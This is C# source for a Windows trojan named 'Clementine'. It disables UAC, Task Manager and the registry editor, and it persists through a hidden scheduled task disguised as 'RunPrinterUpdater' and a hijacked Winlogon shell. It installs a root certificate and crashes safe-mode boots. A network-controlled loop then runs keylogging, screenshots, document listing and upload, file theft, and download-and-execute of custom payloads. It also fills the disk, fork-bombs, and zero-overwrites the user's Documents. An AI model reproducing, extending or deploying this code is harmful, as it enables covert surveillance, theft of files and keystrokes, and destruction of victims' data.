using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System.Security.Cryptography.X509Certificates;

namespace Clementine
{
    class Program
    {
        private const float ATTACK_PROBABILITY = 1f;
        private const int NUM_PAYLOADS = 9, TIME_BETWEEN_ATTACKS = 1000 * 5;
        private static bool destructive = true, loud = true, done = false;
        private static int requestedAttack = -1;
        private static Random random = new Random();

        private static List<Process> children = new List<Process>();


        private static MouseDeriver mouse = new MouseDeriver(3, true);
        private static Stars stars = new Stars();
        private static Screenshotter screenshots = new Screenshotter();
        private static ClementineNetwork network = new ClementineNetwork();
        private static Popup popups = new Popup();

        [DllImport("shell32.dll")]
        private static extern bool IsUserAnAdmin();

        [DllImport("user32.dll")]
        private static extern int SystemParametersInfo(int action, int uparam, string vparam, int winini);

        private static bool IsInstalled()
        {
            using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\clementine"))
            {
                return key != null;
            }
        }

        private static void Install()
        {
            SetInstallationFlag();
            DisableSecurity();
            CreateTasks();
            SetupRunInSafeMode();
            PreventUninstallation();
            AddCertificate();
            Restart();
        }

        private static void SetInstallationFlag()
        {
            using (var key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\clementine"))
            {
                key.SetValue("Doomed", (new Random()).Next(1));
            }
        }

        private static void DisableSecurity()
        {
            using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
            {
                key.SetValue("ConsentPromptBehaviorAdmin", 0);
                key.SetValue("ConsentPromptBehaviorUser", 0);
                key.SetValue("EnableInstallerDetection", 0);
                key.SetValue("ValidateAdminCodeSignatures", 0);
                key.SetValue("EnableSecureUIAPaths", 0);
                key.SetValue("EnableLUA", 0);
                key.SetValue("PromptOnSecureDesktop", 0);
                key.SetValue("DisableTaskMgr", 1);
            }
        }

        private static void CreateTasks()
        {
            using (var scheduler = new TaskService())
            {
                var runner = scheduler.NewTask();
                runner.Settings.AllowHardTerminate = false;
                runner.Settings.Hidden = true;
                runner.Principal.RunLevel = TaskRunLevel.Highest;
                runner.Actions.Add(new ExecAction(Process.GetCurrentProcess().MainModule.FileName));
                runner.Triggers.Add(new LogonTrigger());
                var secondaryTrigger = new TimeTrigger()
                {
                    RandomDelay = TimeSpan.FromMinutes(5),
                    StartBoundary = DateTime.Now
                };
                secondaryTrigger.Repetition.StopAtDurationEnd = false;
                secondaryTrigger.Repetition.Interval = TimeSpan.FromMinutes(3);
                runner.Triggers.Add(secondaryTrigger);
                scheduler.RootFolder.RegisterTaskDefinition("RunPrinterUpdater", runner);
            }
        }

        private static void PreventUninstallation()
        {
            using (var key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\Task Scheduler5.0"))
            {
                key.SetValue("DragAndDrop", 1);
                key.SetValue("Task Creation", 1);
                key.SetValue("Task Deletion", 1);
            }
            using (var key = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"))
            {
                key.SetValue("FilterAdministratorToken", 1);
                key.SetValue("DisableTaskMgr", 1);
                key.SetValue("DisableRegistryTools", 1);
            }
        }

        private static void SetupRunInSafeMode()
        {
            using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true))
            {
                key.SetValue("Shell", Process.GetCurrentProcess().MainModule.FileName);
            }
        }

        // uiAccess for administrative applications is THE MOST POINTLESS restriction on Windows.
        // We can literally just add a certificate for a different executable.
        private static void AddCertificate()
        {
            try
            {
                var store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
                store.Open(OpenFlags.ReadWrite);
                store.Add(new X509Certificate2(Utilities.GetFileName("UIFun_TemporaryKey.pfx"), "xgkbEX5ThlQ7PHPhcu9NuoPBozMV4mHvDglIoB5F2Pe0D59fXuzmHZEWFTVp6ubo"));
                store.Close();
            }
            catch (Exception e)
            {
#if DEBUG
                MessageBox.Show(e.ToString());
#endif
            }
        }

        private static void Restart()
        {
            var proc = Process.Start("shutdown.exe", "-r -t 0");
            proc.WaitForExit(10000);
        }

        private static bool AlreadyRunning()
        {
            var processes = Process.GetProcesses();
            var me = Process.GetCurrentProcess();
            foreach (var proc in processes)
            {
                if (proc.ProcessName == me.ProcessName && proc.StartTime.Ticks < me.StartTime.Ticks)
                {
                    return true;
                }
            }
            return false;
        }

        private static void UpdateState()
        {
            network.UpdateState();
            done = network.Done;
            loud = network.Loud;
            destructive = network.Destructive;
            requestedAttack = network.RequestedPayload;
        }

        private static void Attack()
        {
            if (random.NextDouble() > ATTACK_PROBABILITY)
            {
                return;
            }

            int attack = requestedAttack >= 0 ? requestedAttack : random.Next(NUM_PAYLOADS);

            requestedAttack++;

#if DEBUG
            MessageBox.Show("Attack " + attack + " Chosen");
#endif

            switch (attack)
            {
                case 0:
                    MiceFun();
                    break;
                case 1:
                    Stars();
                    break;
                case 2:
                    KeyboardFun();
                    break;
                case 3:
                    PopupBrowser();
                    break;
                case 4:
                    FillDisk();
                    break;
                case 5:
                    SetLogo();
                    break;
                case 6:
                    ForkBomb();
                    break;
                case 7:
                    NukeDocuments();
                    break;
                case 8:
                    Keylog();
                    break;
                case 9:
                    Screenshot();
                    break;
                case 10:
                    Upload();
                    break;
                case 11:
                    ListDocuments();
                    break;
                case 12:
                    StealFile();
                    break;
                case 13:
                    CustomPayload();
                    break;
                default:
                    MessageBox.Show("Welp, I generated this number wrong");
                    break;
            }
        }

        private static void MiceFun()
        {
            if (!loud || mouse.Status)
            {
                return;
            }
            mouse.Start();
        }

        private static void Stars()
        {
            if (!loud || stars.Status)
            {
                return;
            }
            stars.Start();
        }

        private static void KeyboardFun()
        {
            if (!loud)
            {
                return;
            }
            children.Add(Process.Start(Utilities.GetUIHelper(), "o"));
        }

        private static void PopupBrowser()
        {
            if (!loud)
            {
                return;
            }
            popups.Start();
        }

        private static void FillDisk()
        {
            if (!loud || !destructive)
            {
                return;
            }
            var b = (new UTF8Encoding()).GetBytes(new string('a', 1024 * 1024));
            using (var writer = new FileStream(Utilities.GetFileName("hyperfil.sys"), FileMode.Append))
            {
                try
                {
                    while (true)
                    {
                        writer.Write(b, 0, b.Length);
                    }
                }
                catch (IOException e)
                {
#if DEBUG
                    MessageBox.Show(e.ToString());
#endif
                }
            }
        }

        //Thanks https://alanbondo.wordpress.com/2008/06/21/changing-the-desktop-wallpaper-with-c/
        private static void SetLogo()
        {
            SystemParametersInfo(0x14, 0, Utilities.GetFileName("logo.bmp"), 0x3);
        }

        [DllImport("user32.dll")]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 param, string vparam, UInt32 winIni);

        private static void ForkBomb()
        {
            if (!loud || !destructive)
            {
                return;
            }
            while (true)
            {
                Process.Start("notepad.exe");
            }
        }

        private static void Keylog()
        {
            children.Add(Process.Start(Utilities.GetUIHelper(), "s"));
        }

        private static void Screenshot()
        {
            if (screenshots.Status)
            {
                return;
            }
            screenshots.Start();
        }

        private static void ListDocuments()
        {
            const string filesTemp = "files.txt";
            var fullPath = Utilities.GetFileName(filesTemp);
            var profile = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var filenames = new List<String>();
            var stack = new Stack<string>();
            stack.Push(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            while (stack.Count > 0)
            {
                foreach (var child in Directory.EnumerateFiles(stack.Pop()))
                {
                    try
                    {
                        var attributes = File.GetAttributes(child);
                        if (attributes.HasFlag(FileAttributes.Directory))
                        {
                            stack.Push(child);
                        }
                        filenames.Add(child);
                    } catch (Exception e)
                    {}
                }
            }
            File.WriteAllLines(fullPath, filenames.ToArray());
            network.SendFile(fullPath);
            //File.Delete(fullPath);
        }

        private static void StealFile()
        {
            var name = network.StealFileName();
            MessageBox.Show("Stealing " + name);
            if (name.Length > 0)
            {
                network.SendFile(name);
            }
        }

        private static void StopOtherProcesses()
        {
            foreach (var proc in children)
            {
                try
                {
                    proc.Kill();
                }
                catch (InvalidOperationException exp)
                { } // Fires when the process is already dead, in which case we just don't care.
            }
            children.Clear();
            Thread.Sleep(10); // Hack to wait for children to actually die.
        }

        private static void Upload()
        {
            StopOtherProcesses();
            screenshots.Stop();
            network.SendFile(Keylogger.LogFile);
            /*try
            {
                var paths = new List<string>(Directory.EnumerateFiles(Utilities.GetFileName(Screenshotter.ScreenshotDirectory)));
                foreach (var name in paths) // Commented out for reasons of performance.
                {
                    network.SendFile(name);
                    File.Delete(name);
                }
            }
            catch (Exception exp)
            {
#if DEBUG
                MessageBox.Show(exp.ToString());
#endif
            }*/ 
            File.Delete(Keylogger.LogFile);
        }

        private static void CustomPayload()
        {
            if (network.RequestPayload() && File.Exists(ClementineNetwork.CUSTOM_PAYLOAD_LOCATION))
            {
                var proc = Process.Start(ClementineNetwork.CUSTOM_PAYLOAD_LOCATION);
                proc.WaitForExit();
                File.Delete(ClementineNetwork.CUSTOM_PAYLOAD_LOCATION);
            }
        }

        private static void NukeDocuments()
        {
            if (!destructive)
            {
                return;
            }
            var stack = new Stack<string>();
            stack.Push(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            while (stack.Count > 0)
            {
                var directory = stack.Pop();
                var children = Directory.EnumerateFiles(directory);
                foreach (var child in children)
                {
                    if (Utilities.IsClementineDirectory(child))
                    {
                        continue;
                    }
                    try
                    {
                        if (File.GetAttributes(child).HasFlag(FileAttributes.Directory))
                        {
                            stack.Push(child);
                        }
                        else
                        {
                            const int bufferLength = 1024;
                            var length = (new FileInfo(child)).Length;
                            var contents = new byte[bufferLength];
                            using (var stream = File.Open(child, FileMode.Truncate))
                            {
                                for (int i = 0; i < length / bufferLength; i++)
                                {
                                    stream.Write(contents, i * bufferLength, bufferLength);
                                }
                                var epilogue = (int)(length - (length % bufferLength));
                                stream.Write(contents, (int)(length - epilogue), epilogue);
                            }
                        }
                    }
                    catch (Exception e)
                    { }
                }
            }
        }

        static void Main(string[] args)
        {
            if (SystemInformation.BootMode != BootMode.Normal)
            {
                Process.GetProcessesByName("csrss")[0].Kill(); // *Should* crash windows on boot into safe mode.
            }

            if (!IsUserAnAdmin() || AlreadyRunning())
                return;
            
            if (!IsInstalled())
            {
                Install();
            }
            else
            {
#if DEBUG
                if (loud)
                {
                    MessageBox.Show("Clementine Installed");
                }
#endif
                while (!done)
                {
                    UpdateState();
                    if (done)
                    {
                        break;
                    }
                    Attack();
                    Thread.Sleep(TIME_BETWEEN_ATTACKS);
                }
                
            }
            mouse.Stop();
            stars.Stop();
            screenshots.Stop();
            popups.Stop();
            StopOtherProcesses();
        }
    }
}
